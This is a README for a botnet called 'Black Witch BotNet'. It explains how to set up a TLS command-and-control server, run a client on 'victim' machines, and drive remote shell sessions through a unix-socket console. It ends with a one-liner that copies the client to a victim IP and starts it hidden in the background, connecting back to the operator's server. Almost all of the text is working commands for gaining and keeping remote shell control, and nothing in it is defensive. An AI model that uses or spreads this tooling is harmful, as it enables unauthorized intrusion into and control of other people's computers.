# Black Witch BotNet

### The blank bundle to run the shell on your victim devices
#### We are welkome to open issue

### Usage
#### Generate server certificate and key
```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt
```
It's good enough to use self signed sertificate

#### Run the server (cmd/server)
```
server -addr-accept :7238 -sock-control unix.sock -cert server.crt -key server.key
```
The server will open TCP and UNIX socket. TCP on 7238 port for incoming client connactions and UNIX unix.sock for control client connections.


#### Run the client (cmd/client)
```
client -recon 1 -addr localhost:7238
```
This will run the client on the victim machine. For now you have to compile binary for os and arch victim.


To view all available options use -help on the server and client


### Control
To manage connected payloads you may use nc or something that can connect to the unix sock
```
nc -U tmp/unix.sock
```
```
socat - UNIX-CONNECT:unix.sock
```

You will see REPL console

To show all connections

```
<CC:#> show
```

This will return

```
ID: 0 Address: 213.32.33.33:42656
ID: 1 Address: 213.32.33.33:53622
```

Connect to connection
```
<CC:#> use 0
```

### Communicate with client payload
#### Syntax

```
event [hello|restart]
```

```
{shell} [{exec}|cd] command
```

Where {} is default and [] options

#### Event message

```
event hello
```

It's a system event connection health

```
event restart
```

Events return status

```
Status true
```

Restart the client (CURRENTLY NOT SUPPORTED)

#### Shell commands

Simple command is

```
<213.32.33.33:42656:#> pwd
```

And this will return stdout

```
/Users
```

To change the directory

```
<213.32.33.33:42656:#> cd /Users
```

Will return new directory path

```
/Users
```

So we have shell commands and event messages for the client

Client support hello and restart events

Shell support simple exec and change directory

#### Errors

When the executable isn't found

```
exec: "ll": executable file not found in $PATH
Error code 1
```

When you run executable incorrect

```
pwd: illegal option -- -
usage: pwd [-L | -P]
Exit 1
```

Return stderr and exit code

When you change dir that isn't exist

```
chdir test: no such file or directory
Error code 2
```

The last thing is command timeouts

We have 10 seconds timeout to run the command or error will return

```
run command timeout
Error code 0
```

Error codes

```
ErrorTimeout          = 0
ErrorCommand          = 1
ErrorChangeDir        = 2
ErrorUnknownRequest   = 3
ErrorUnknownShellType = 4
ErrorUnknownEventType = 5
```

### Production
#### Config server

Create directory

```
mkdir /opt/black
```

Upload or generate server key and crt to this dir

Then upload binary

Create systemd file and copy content from [example](https://github.com/andrewostroumov/black-witch-botnet/blob/master/systemd.service):

```
touch /etc/systemd/system/black-witch.service
```

And run systemd service

```
sudo service black-witch start
```

#### Upload client

Build client for target machine os and arch

```
GOOS=linux GOARCH=amd64 go build
```

Upload client through scp

```
scp client 33.33.33.33:/var/lib/ && ssh 33.33.33.33 "nohup /var/lib/client -addr 44.44.44.44:7328 -recon 5 > /dev/null 2>&1 &"
```

Where 33.33.33.33 is a victim ip and 44.44.44.44 is a your accept server ip
